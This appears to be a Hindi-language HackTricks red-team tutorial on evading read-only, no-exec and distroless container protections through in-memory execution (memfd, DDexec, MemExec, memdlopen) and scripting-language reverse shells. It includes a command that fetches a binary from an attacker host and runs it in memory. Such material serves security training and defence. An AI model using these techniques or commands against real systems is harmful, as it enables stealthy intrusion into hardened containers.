# फाइल सिस्टम सुरक्षा बायपास: रीड-ओनली / नो-एक्जीक्यूट / डिस्ट्रोलेस

<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें.

</details>

## वीडियो

निम्नलिखित वीडियो में आप इस पृष्ठ में उल्लिखित तकनीकों को अधिक गहराई से समझा गया है:

* [**DEF CON 31 - लिनक्स मेमोरी मैनिपुलेशन की खोज स्टील्थ और इवेजन के लिए**](https://www.youtube.com/watch?v=poHirez8jk4)
* [**DDexec-ng & इन-मेमोरी dlopen() के साथ स्टील्थ घुसपैठ - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## रीड-ओनली / नो-एक्जीक्यूट परिदृश्य

लिनक्स मशीनों को **रीड-ओनली (ro) फाइल सिस्टम सुरक्षा** के साथ माउंट किया जाना आम होता जा रहा है, विशेष रूप से कंटेनरों में। यह इसलिए है क्योंकि कंटेनर को ro फाइल सिस्टम के साथ चलाना `securitycontext` में **`readOnlyRootFilesystem: true`** सेट करके उतना ही आसान है:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

हालांकि, यदि फाइल सिस्टम को ro के रूप में माउंट किया गया है, तो भी **`/dev/shm`** लिखने योग्य रहेगा, इसलिए यह झूठ है कि हम डिस्क में कुछ भी नहीं लिख सकते। हालांकि, यह फोल्डर **नो-एक्जीक्यूट सुरक्षा** के साथ माउंट किया जाएगा, इसलिए यदि आप यहां एक बाइनरी डाउनलोड करते हैं तो आप **इसे निष्पादित नहीं कर पाएंगे**।

{% hint style="warning" %}
रेड टीम के दृष्टिकोण से, यह **डाउनलोड करना और निष्पादित करना जटिल बनाता है** बाइनरीज को जो पहले से सिस्टम में नहीं हैं (जैसे बैकडोर्स या एन्यूमरेटर्स जैसे `kubectl`).
{% endhint %}

## सबसे आसान बायपास: स्क्रिप्ट्स

ध्यान दें कि मैंने बाइनरीज का उल्लेख किया है, आप **किसी भी स्क्रिप्ट को निष्पादित कर सकते हैं** जब तक कि इंटरप्रेटर मशीन के अंदर हो, जैसे कि **शेल स्क्रिप्ट** अगर `sh` मौजूद है या **पायथन स्क्रिप्ट** अगर `python` इंस्टॉल है।

हालांकि, यह आपके बाइनरी बैकडोर या अन्य बाइनरी टूल्स को निष्पादित करने के लिए पर्याप्त नहीं है।

## मेमोरी बायपास

यदि आप एक बाइनरी को निष्पादित करना चाहते हैं लेकिन फाइल सिस्टम इसकी अनुमति नहीं दे रहा है, तो ऐसा करने का सबसे अच्छा तरीका **मेमोरी से निष्पादित करना** है, क्योंकि **सुरक्षा वहां लागू नहीं होती**।

### FD + exec सिस्टम कॉल बायपास

यदि मशीन के अंदर कुछ शक्तिशाली स्क्रिप्ट इंजन हैं, जैसे कि **Python**, **Perl**, या **Ruby** तो आप मेमोरी से बाइनरी को डाउनलोड कर सकते हैं, इसे मेमोरी फाइल डिस्क्रिप्टर में स्टोर कर सकते हैं (`create_memfd` सिस्टम कॉल), जो उन सुरक्षाओं से संरक्षित नहीं होगा और फिर **`exec` सिस्टम कॉल** को कॉल करके **fd को निष्पादित करने के लिए फाइल के रूप में इंगित करें**।

इसके लिए आप [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) प्रोजेक्ट का आसानी से उपयोग कर सकते हैं। आप इसे एक बाइनरी पास कर सकते हैं और यह इंगित की गई भाषा में एक स्क्रिप्ट जनरेट करेगा जिसमें **बाइनरी संपीड़ित और b64 एन्कोडेड** होगी और `create_memfd` सिस्टम कॉल को कॉल करके बनाए गए **fd** में **डिकोड और डिकंप्रेस करने के निर्देश** होंगे और इसे चलाने के लिए **exec** सिस्टम कॉल को कॉल करेंगे।

{% hint style="warning" %}
यह PHP या Node जैसी अन्य स्क्रिप्टिंग भाषाओं में काम नहीं करेगा क्योंकि उनके पास स्क्रिप्ट से कच्चे सिस्टम कॉल्स को कॉल करने का कोई **डिफ़ॉल्ट तरीका नहीं है**, इसलिए `create_memfd` को कॉल करके बाइनरी को स्टोर करने के लिए **मेमोरी fd** बनाना संभव नहीं है।

इसके अलावा, `/dev/shm` में एक फाइल के साथ एक **रेगुलर fd** बनाना काम नहीं करेगा, क्योंकि आपको इसे चलाने की अनुमति नहीं होगी क्योंकि **नो-एक्जीक्यूट सुरक्षा** लागू होगी।
{% endhint %}

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) एक तकनीक है जो आपको अपनी **`/proc/self/mem`** को ओवरराइट करके अपनी प्रक्रिया की मेमोरी को **संशोधित करने** की अनुमति देती है।

इसलिए, प्रक्रिया द्वारा निष्पादित किए जा रहे **असेंबली कोड को नियंत्रित करके**, आप एक **शेलकोड** लिख सकते हैं और प्रक्रिया को "म्यूटेट" कर सकते हैं ताकि **कोई भी मनमाना कोड निष्पादित किया जा सके**।

{% hint style="success" %}
**DDexec / EverythingExec** आपको अपने खुद के **शेलकोड** या **किसी भी बाइनरी** को **मेमोरी** से लोड करने और **निष्पादित करने** की अनुमति देगा।
{% endhint %}
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
इस तकनीक के बारे में अधिक जानकारी के लिए Github देखें या:

{% content-ref url="ddexec.md" %}
[ddexec.md](ddexec.md)
{% endcontent-ref %}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) DDexec का अगला कदम है। यह एक **DDexec शेलकोड डेमोनाइज्ड** है, इसलिए जब भी आप **एक अलग बाइनरी चलाना चाहते हैं** तो आपको DDexec को फिर से लॉन्च करने की जरूरत नहीं होती, आप सिर्फ DDexec तकनीक के माध्यम से memexec शेलकोड चला सकते हैं और फिर **इस डेमोन से संवाद करके नए बाइनरीज को लोड और चलाने के लिए पास कर सकते हैं**।

आप [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php) पर **PHP रिवर्स शेल से बाइनरीज को चलाने के लिए memexec का उपयोग कैसे करें** इसका उदाहरण पा सकते हैं।

### Memdlopen

DDexec के समान उद्देश्य के साथ, [**memdlopen**](https://github.com/arget13/memdlopen) तकनीक बाइनरीज को मेमोरी में **आसानी से लोड करने** की अनुमति देती है ताकि बाद में उन्हें चलाया जा सके। यह निर्भरताओं वाले बाइनरीज को लोड करने की भी अनुमति दे सकता है।

## Distroless Bypass

### Distroless क्या है

Distroless कंटेनर्स में केवल वह **न्यूनतम घटक होते हैं जो किसी विशेष एप्लिकेशन या सेवा को चलाने के लिए आवश्यक होते हैं**, जैसे कि लाइब्रेरीज और रनटाइम निर्भरताएं, लेकिन बड़े घटकों जैसे कि पैकेज मैनेजर, शेल, या सिस्टम उपयोगिताओं को शामिल नहीं करते हैं।

Distroless कंटेनर्स का उद्देश्य अनावश्यक घटकों को हटाकर और कंटेनर्स के हमले की सतह को कम करके शोषण किए जा सकने वाले भेद्यताओं की संख्या को कम करना है।

### रिवर्स शेल

एक distroless कंटेनर में आपको शायद `sh` या `bash` भी नहीं मिलेगा ताकि आप एक सामान्य शेल प्राप्त कर सकें। आपको `ls`, `whoami`, `id` जैसे बाइनरीज भी नहीं मिलेंगे... सब कुछ जो आप आमतौर पर एक सिस्टम में चलाते हैं।

{% hint style="warning" %}
इसलिए, आप **रिवर्स शेल प्राप्त नहीं कर पाएंगे** या सिस्टम को **एन्यूमरेट** नहीं कर पाएंगे जैसा कि आप आमतौर पर करते हैं।
{% endhint %}

हालांकि, अगर समझौता किया गया कंटेनर उदाहरण के लिए एक फ्लास्क वेब चला रहा है, तो पायथन इंस्टॉल है, और इसलिए आप एक **पायथन रिवर्स शेल** प्राप्त कर सकते हैं। अगर यह नोड चला रहा है, तो आप एक नोड रिव शेल प्राप्त कर सकते हैं, और यही बात लगभग किसी भी **स्क्रिप्टिंग भाषा** के साथ होती है।

{% hint style="success" %}
स्क्रिप्टिंग भाषा का उपयोग करके आप भाषा की क्षमताओं का उपयोग करके सिस्टम को **एन्यूमरेट** कर सकते हैं।
{% endhint %}

अगर **कोई `read-only/no-exec`** सुरक्षा नहीं है तो आप अपने रिवर्स शेल का दुरुपयोग करके फाइल सिस्टम में अपने बाइनरीज को **लिख सकते हैं** और उन्हें **चला सकते हैं**।

{% hint style="success" %}
हालांकि, इस प्रकार के कंटेनर्स में ये सुरक्षा आमतौर पर मौजूद होती हैं, लेकिन आप **पिछली मेमोरी एक्जीक्यूशन तकनीकों का उपयोग करके उन्हें बायपास कर सकते हैं**।
{% endhint %}

आप [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE) पर **उदाहरण** पा सकते हैं कि कैसे कुछ RCE भेद्यताओं का **शोषण करके स्क्रिप्टिंग भाषाओं के रिवर्स शेल्स** प्राप्त करें और मेमोरी से बाइनरीज को चलाएं।

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* अगर आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा एक्सक्लूसिव [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में शामिल हों या मुझे **Twitter** 🐦 पर **फॉलो** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के [**github repos**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके अपनी हैकिंग ट्रिक्स शेयर करें।

</details>
